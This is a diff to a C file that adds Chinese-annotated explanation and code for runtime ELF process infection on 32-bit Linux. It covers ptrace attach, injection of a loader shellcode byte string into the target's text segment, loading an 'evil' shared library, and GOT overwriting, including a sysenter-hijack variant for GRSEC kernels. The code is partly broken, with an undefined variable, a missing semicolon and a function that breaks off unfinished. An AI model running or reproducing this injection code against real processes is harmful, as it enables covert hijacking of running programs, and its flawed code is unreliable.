@@ -147,6 +147,7 @@ int main(void)
 static int _write(int fd, void *buf, int count)
 {
   long ret;
+  /* a: eax, S: esi, c: ecx, d: edx , "0"(SYS_write)将SYS_write放到eax中*/
   __asm__ __volatile__("pushl %%ebx\n\t"
                        "movl %%esi,%%ebx\n\t"
                        "int $0x80\n\t"
@@ -269,6 +270,7 @@ int evilprint(char *buf)
  *   # We need this to transfer control back to our hijacker once our hsellcode is done executing
  *   int 3
  *   # To get the address of the string dynamically we use call/pop method
+ *   # Call指令会将下一条指令的地址push到栈上，然后跳到目标地址处开始执行
  * B:
  *   call A
  *   .string "libtest.so.1.0"
@@ -293,6 +295,366 @@ int evilprint(char *buf)
  *  通过使用ptrace将(reg.eip-20)读到buffer中来定位sysenter,然后在buffer中搜索指令"\x0f\x34"，因此sysenter = (reg.eip - 20) + index
  *  修改%eip来指向sysenter，然后使用PTRACE_SINGLESTEP来执行指令直到sysenter. 重复3-6的过程，但使用mmap()，然后进入步骤7
  *  恢复数据段(data segment)
+ *  上面过程的代码将在后面给出
  *
+ *  同样值得注意的是我们可以通过使用MAP_FIXED参数的mmap来修改代码段(.text)的内存结构，从而将代码注入到代码段中，但是这种修改将会明显的反映在/proc/pid/maps中。
+ *
+ *  Hijacker 算法
+ *  1. 通过解析/proc/<pid>/maps定位目标进程
+ *  2. 解析PLT来获取需要的GOT地址
+ *  3. 附加到目标进程上
+ *  4. 寻找一个地方来加载我们的.so loader shellcode
+ *  下面的步骤5-8对于有GRSEC补丁的内核不同
+ *
+ *  没有GRSEC的内核：
+*   5. 注入新的代码，并且保存被注入代码覆盖的原始代码
+*   6. 获取进程的寄存器，保存EIP，然后将EIP修改为指向我们代码
+*   7. 继续执行目标进程，它将执行我们注入的.so loader shellcode，然后将我们的lib加载到进程中
+*   8. 重置寄存器，恢复原来的代码，是进程能继续执行。
+*
+*   包含GRSEC的内核:
+*   6. 定位sysenter
+*   7. 保存寄存器状态
+*   8. 修改寄存器和args来调用open/mmap
+*   9. 从%eax中获取我们动态库的基地址(Get base address of our evil library form %eax)
+*   10. 通过扫描指令的方式从动态库中获取我们的evil function的地址
+*   11. 获取并保存GOT中保存的原函数的地址
+*   12. 用我们的evil function的地址覆盖GOT中原函数的地址
+*   13. Detach目标进程
+*
+*   下面我们来详细解释上述步骤:
+*   STEP1: 第一步我们需要定位产生目标进程的二进制文件,进程地址空间表类似于这样：
+*-- /proc/<pid>/map --
+
+08048000-08049000 r-xp 00000000 08:01 5654053    /home/elf/got_hijack/test
+
+08049000-0804a000 rw-p 00000000 08:01 5654053    /home/elf/got_hijack/test
+
+b7e19000-b7e1a000 rw-p b7e19000 00:00 0
+
+b7e1a000-b7f55000 r-xp 00000000 08:01 9127170    /lib/tls/i686/cmov/libc-2.5.so
+
+b7f55000-b7f56000 r--p 0013b000 08:01 9127170    /lib/tls/i686/cmov/libc-2.5.so
+
+b7f56000-b7f58000 rw-p 0013c000 08:01 9127170    /lib/tls/i686/cmov/libc-2.5.so
+
+b7f58000-b7f5b000 rw-p b7f58000 00:00 0
+
+b7f65000-b7f68000 rw-p b7f65000 00:00 0
+
+b7f68000-b7f81000 r-xp 00000000 08:01 9093141    /lib/ld-2.5.so
+
+b7f81000-b7f83000 rw-p 00019000 08:01 9093141    /lib/ld-2.5.so
+
+bff6d000-bff82000 rw-p bffeb000 00:00 0          [stack]
+
+ffffe000-fffff000 r-xp 00000000 00:00 0          [vdso]]]
+*
+* 这个文件展现了进程的内存镜像,包括生成进程的可执行文件和映射到进程中的动态库。基地址展现在第一行(8048000),我们可以从这个文件中获得，也可以从text的phdr->p_vaddr获取。对于ET_DYN文件有一些不同，我们获取它的基地址，然后根据它在内存中的加载地址获取偏移，从而得到真实的地址。需要注意的是包含GRSEC补丁的系统将不会在这个map文件中展现地址，那么我们只能用其它方式获取地址，例如phdr->p_vaddr.
+*
+*  STEP 2
+*  我们将决定需要hijack的函数，获取它的重定位项从而获取获得相应的GOT address/offset,通过解析可执行文件就可以获取这些信息(当然通过解析进程内存映像也是可以的)，下面的代码将获取"readelf -r"从ELF文件中得到的信息
+ */
+ /* my custom struct linking_info looks like: */
+ struct linking_info
+{
+  char name[256]; /* symbol name   */
+  int index;      /* symbol number */
+  int count;      /* total # of symbols */
+  uint32_t offset; /* adddr/offset into the GOT */
+}
+
+/* unsigned char *mem is a pointer to an mmap of the ELF file */
+struct linking_info *get_plt(unsigned char *mem)
+{
+  Elf32_Ehdr *ehdr;
+  Elf32_Shdr *shdr, *shdrp, *symshdr;
+  Elf32_Sym *syms, *symsp;
+  Elf32_Rel *rel;
+
+  char *symbol;
+  int i, j, symcount, k;
+  struct linking_info *link;
+  ehdr = (Elf32_Ehdr *)mem;
+  shdr = (Elf32_Shdr *)(mem + ehdr->e_shoff);
+  shdrp = shdr;
+  for (i = ehdr->e_shnum; i-- > 0; shdrp++)
+  {
+    if (shdrp->sh_type == SHT_DYNSYM)
+    {
+      symshdr = &shdr[shdrp->sh_link];
+      if ((symbol = malloc(symshdr->sh_size)) == NULL)
+        goto fatal;
+      memcpy(symbol, (mem + symshdr->sh_offset), symshdr->sh_size);
+      if ((syms = (Elf32_Sym *)malloc(shdrp->sh_size)) == NULL)
+        goto fatal;
+      memcpy((Elf32_Sym *)syms, (Elf32_Sym *)(mem + shdrp->sh_offset), shdrp->sh_size);
+      symsp = syms;
+      symcount = (shdrp->sh_size / sizeof(Elf32_Sym));
+      link = (struct linking_info *)malloc(sizeof(struct linking_info)* symcount);
+      if (!link)
+        goto fatal;
+      link[0].count = symcount;
+      for (j=0; j<symcount; j++, symsp++)
+      {
+        strncpy(link[j].name, &symbol[symsp->st_name], sizeof(link[j].name) - 1);
+        if (!link[j].name)
+          goto fatal;
+        link[j].index = j;
+      }
+      break;
+    }
+  }
+  for (i = ehdr->e_shnum; i-- > 0; shdr++)
+  {
+    switch(shdr->sh_type)
+    {
+      case SHT_REL:
+        rel = (Elf32_Rel *) (mem + shdr->sh_offset);
+        for (j=0; j<shdr->sh_size; j+=sizeof(Elf32_Rel),rel++)
+        {
+          for (k=0; k<symcount; k++)
+          {
+            if (ELF32_R_SYM(rel->r_info) == link[k].index)
+              link[k].offset = ret->r_offset;
+          }
+        }
+        break;
+      case SHT_RELA:
+        break;
+      default:
+        break;
+    }
+  }
+  return link;
+fatal:
+  return NULL;
+}
+
+/* To call the function we could do: */
+if ((lp = (struct linking_info*)get_plt(mem)) == NULL)
+{
+  printf("get_plt() failed\n");
+  goto done;
+}
+/* 'struct lp'将为我们提供相关的PLT信息来读取我们要hijack的目标符号的GOT entry
+ *
+ * STEP 3
+ * 现在我们来用PTRACE_ATTACH附加到进程:
+ */
+ if (ptrace(PTRACE_ATTACH, pid, NULL, NULL))
+{
+  printf("Failed to attach to process\n");
+  exit(-1);
+}
+waitpid(pid, &status, WUNTRACED);
+
+/* STEP 4-8 (无GRSEC的方法)
+ * 我们需要目标进程加载我们的evil .so(动态库),因此我们需要将loader shellcode注入到进程中，有人可能会想到保存到stack上，但是很多系统栈不可执行(non-executable stack)，使用代码段(text segment)是明智的选择，这样我们可以直接从基地址8048000开始覆盖前90字节写入我们的shellcode，当然在覆盖之前我们必须保存被覆盖的内容。
+*/
+/* 下面是我们的shellcode */
+char mmap_shellcode[] =
+"\xe9\x3b\x00\x00\x00\x31\xc9\xb0\x05\x5b\x31\xc9\xcd\x80\x83\xec"
+"\x18\x31\xd2\x89\x14\x24\xc7\x44\x24\x04\x00\x20\x00\x00\xc7\x44"
+"\x24\x08\x07\x00\x00\x00\xc7\x44\x24\x0c\x02\x00\x00\x00\x89\x44"
+"\x24\x10\x89\x54\x24\x14\xb8\x5a\x00\x00\x00\x89\xe3\xcd\x80\xcc"
+"\xe8\xc0\xff\xff\xff\x6c\x69\x62\x74\x65\x73\x74\x2e\x73\x6f\x2e"
+"\x31\x2e\x30\x00";
+
+/* 我们的hijacker将使用如下的函数来迫使目标进程加载我们的动态库
  * */
+int mmap_library(int pid)
+{
+  struct user_regs_struct reg;
+  long eip, esp, string, offset, str, eax, ebx, ecx, edx;
+  int i, j=0, ret, status;
+  unsigned long buf[30];
+  unsigned char saved_text[94];
+  unsigned char *p;
+  ptrace(PTRACE_GETREGS, pid, NULL, &reg);
+  /* 保存寄存器状态 */
+  eip = reg.eip;
+  esp = reg.esp;
+  eax = reg.eax;
+  ebx = reg.ebx;
+  ecx = reg.ecx;
+  edx = reg.edx;
+
+  offset = text_base;
+  printf("%%eip -> 0x%x\n", eip);
+  printf("Injecting mmap_shellcode at 0x%x\n", offset);
+  /* 在当前EIP处写入我们的shellcode */
+  /* 首先我们必须备份原来的代码 */
+  for (i=0; i< 90; i += 4)
+    buf[j++] = ptrace(PTRACE_PEEKTEXT, pid, (offset + i));
+  p = (unsigned char *)buf;
+  memcpy(saved_text, p, 90);
+
+  /* 在text的开头处写入shellcode*/
+  for (i=0; i<90; i += 4)
+    ptrace(PTRACE_POKETEXT, pid, (offset + i), *(long *)(mmap_shellcode + i));
+  printf("\nSetting %%eip to 0x%x\n", offset);
+  reg.eip = offset + 2;
+  ptrace(PTRACE_SETREGS, pid, NULL, &reg);
+  ptrace(PTRACE_CONT, pid, NULL, NULL);
+  wait(NULL);
+  /* check where eip is now at */
+  ptrace(PTRACE_GETREGS, pid, NULL, &reg);
+  printf("%%eip is now at 0x%x, resetting is to 0x%x\n", reg.eip, eip);
+  printf("inserting original code back\n");
+  for(j = 0,i = 0; i < 90; i += 4)
+    buf[j++] =  ptrace(PTRACE_POKETEXT, pid, (offset+i), *(long*) (saved_text + i));
+  /* 重置寄存器状态 */
+  reg.eip = eip;
+  reg.eax = eax;
+  reg.ebx = ebx;
+  reg.ecx = ecx;
+  reg.edx = edx;
+  reg.esp = esp;
+
+  ptrace(PTRACE_SETREGS, pid, NULL, &reg);
+  /* detach -- when we re-attach we will have access to our*/
+  /* shared library */
+  if (ptrace(PTRACE_DETACH, pid, NULL, NULL) == -1)
+  {
+    perror("ptrace_detach");
+    exit(-1);
+  }
+}
+
+/* STEP 4-8 (内核有GRSEC补丁) */
+/* 注意：这个方法假定GRSEC补丁并不禁止使用ptrace
+ * 正如之前所说的，grsec补丁将会禁止向一个不可写的映射区间写数据，这样的话通过注入shellcode的方式加载动态库的方法将不可行，这种情况下，我们将不注入任何代码，而是hijack已有的系统调用入口然后利用它来首先执行我们伪造的系统调用，然后再执行真实的系统调用。我们想动态的定位sysenter的地址(不通过/proc/<pid>/map文件)，我们可以使用PTRACE_SYSCALL来达到目的。在很多的内核中，linux-gate并不会随机化(在当前的ubuntu系统上，随机化了linux-gate，见linux-vdso.so.1的映射地址)，但是获取linux-gate中的sysenter的地址必须动态进行，因为被grsec保护的内核对每个进程动态加载linux-gate到内存中。一旦我们获取了sysenter的地址，我们从sysenter的第五个字节开始，如果直接从sysenter开始，那么在有些系统上这个方法似乎不会成功。我们将eax设为SYS_open的系统调用编号，将库文件字符串保存在数据段中(data segment)。我们接下来单步执行5个步骤，这样我们将get through sysenter,最后%eax将保存返回值，这个返回值就是供mmap调用的fd，接下来我们使用同样的方法调用mmap，但是我们将所有的参数保存在数据段中动态库字符串的后面，将它们的地址保存在%bx中。一个显著的不同是我们将分开映射代码段(text segment)和数据段(data segment)。直接将一整个文件映射到内存是无法工作的，因为代码段不能有可写权限，数据段不能有可执行权限，这是PaX的mprotect()的限制
+ * linux-gate(被随机化了):
+ * sniper@sniper-Aspire-4752:~/exploit/Virus$ ldd test
+ * linux-vdso.so.1 =>  (0x00007ffff75ff000)
+ * libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f4ffe709000)
+ * /lib64/ld-linux-x86-64.so.2 (0x00007f4ffeae3000)
+ * sniper@sniper-Aspire-4752:~/exploit/Virus$ ldd test
+ * linux-vdso.so.1 =>  (0x00007fff38de5000)
+ * libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fe49094e000)
+ * /lib64/ld-linux-x86-64.so.2 (0x00007fe490d28000)
+ *
+ * 下面来看代码：
+ */
+int grsec_mmap_library(int pid)
+{
+  struct user_regs_struct reg;
+  long eip, esp, string, offset, str, ebx, eax, ecx, orig_eax, data;
+  int syscall;
+  int i,j = 0, ret, status, fd;
+  char library_string[MAXBUF];
+  char orig_ds[MAXBUF];
+  char buf[MAXBUF]={0};
+  unsigned char tmp[8192];
+  char open_done = 0, mmap_done = 0;
+  unsigned long int80 = 0;
+  unsigned long sysenter = 0;
+
+  strcpy(library_string, EVILLIB_FULLPATH);
+
+  /* 保存data segment的第一部分数据，这部分数据将被我们用来填充*/
+  /* 字符串和一些变量 */
+  memrw ((unsigned long *)orig_ds, data_segment, strlen(library_string)+32, pid, 0);
+
+  /* store our string for our evil lib there */
+  for (i = 0; i < strlen(library_string); i += 4)
+    ptrace(PTRACE_POKETEXT, pid, (data_segment + i), *(long*)(library_string + i));
+  /* verify we have the correct string */
+  for (i = 0; i < strlen(library_string); i += 4)
+    *(long *)&buf[i] = ptrace(PTRACE_PEEKTEXT, pid, (data_segment + i));
+  if (strcmp(buf, EVILLIB_FULLPATH) == 0)
+    printf("Verified string is stored in DS: %s\n", buf);
+  else
+  {
+    printf("String was not properly stored in DS: %s\n", buf);
+    return 0;
+  }
+
+  ptrace(PTRACE_SYSCALL, pid, NULL, NULL);
+  wait(NULL);
+
+  ptrace(PTRACE_GETREGS, pid, NULL, &reg);
+  eax = reg.eax;
+  ebx = reg.ebx;
+  ecx = reg.ecx;
+  edx = reg.edx;
+  eip = reg.eip;
+  esp = reg.esp;
+
+  long syscall_eip = reg.eip - 20;
+  /* this gets sysenter dynamically incase its randomized */
+  if (!static_sysenter)
+  {
+    memrw((unsigned long *)tmp, syscall_eip, 20, pid, 0);
+    for (i = 0; i < 20; i++)
+    {
+      if (!(i % 10))
+        printf("\n");
+      printf("%.2x", tmp[i]);
+      if (tmp[i] == 0x0f && tmp[i + 1] == 0x34)
+        sysenter = syscall_eip + i;
+    }
+  }
+  /* this works only if sysenter isn't at random location*/
+  else
+  {
+    memrw((unsigned long *)tmp, 0xffffe000, 8192, pid, 0);
+    for (i = 0; i < 8192; i++)
+    {
+       if (tmp[i] == 0x0f && tmp[i+1] == 0x34)
+          sysenter = 0xffffe000 + i;
+    }
+  }
+  sysenter -= 5;
+  if (!sysenter)
+  {
+     printf("Unable to find sysenter\n");
+     exit(-1);
+  }
+  printf("Sysenter found: %x\n", sysenter);
+  /*
+   *
+   *          sysenter should point to:
+   *              push   %ecx
+   *              push   %edx
+   *              push   %ebp
+   *              mov    %esp,%ebp
+   *              sysenter
+   */
+  ptrace(PTRACE_DETACH, pid, NULL, NULL);
+  wait(0);
+  if (ptrace(PTRACE_ATTACH, pid, NULL, NULL))
+  {
+    perror("ptrace_attach");
+    exit(-1);
+  }
+  waitpid(pid, &status, WUNTRACED);
+
+  reg.eax = SYS_open;
+  reg.ebx = (long)data_segment;
+  reg.ecx = 0;
+  reg.eip = sysenter;
+
+  ptrace(PTRACE_SETREGS, pid, NULL, &reg);
+  ptrace(PTRACE_GETREGS, pid, NULL, &reg);
+
+  for (i = 0; i < 5; i++)
+  {
+    ptrace(PTRACE_SINGLESTEP, pid, NULL);
+    wait(NULL);
+    ptrace(PTRACE_GETREGS, pid, NULL, &reg);
+    if (reg.eax != SYS_open)
+      fd = reg.eax;
+  }
+  offset = (data_segment + strlen(library_string)) + 8;
+
+  reg.eip = sysenter;
+  reg.eax = SYS_mmap;
+  reg.ebx = offset;
+
+  /* MAP IN TEXT RE */
+
+}
+
 
